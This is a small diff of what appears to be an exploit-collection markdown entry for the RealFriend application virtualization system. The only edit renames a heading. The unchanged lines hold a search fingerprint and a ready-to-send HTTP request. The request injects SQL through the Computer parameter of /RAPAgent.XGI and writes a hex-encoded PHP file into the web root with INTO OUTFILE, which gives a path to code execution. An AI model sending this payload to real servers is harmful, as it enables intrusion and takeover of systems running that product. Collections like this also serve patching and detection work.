@@ -7,7 +7,7 @@
 title="瑞友天翼－应用虚拟化系统"
 ```
 
-## poc
+## POC
 ```
 /RAPAgent.XGI?CMD=GETApplication&AppID=APP00000001&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27C:/Program+Files+(x86)/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&Finger=A45A2E5E3&IP= HTTP/1.1
 Host: 
